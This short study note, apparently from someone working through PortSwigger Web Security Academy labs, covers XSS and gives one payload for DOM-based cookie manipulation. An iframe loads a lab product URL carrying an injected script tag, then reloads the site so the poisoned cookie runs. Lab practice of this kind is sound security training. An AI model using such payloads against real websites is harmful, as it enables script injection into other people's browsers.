## XSS Vulnerabilities:
**Things to look for:
- Ctrl+F to find event listener, then use the following payloads in exploit server.
	- ==DOM-based cookie manipulation== - 
```
<iframe src="https://lab_id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://lab_id.web-security-academy.net';window.x=1;">
```
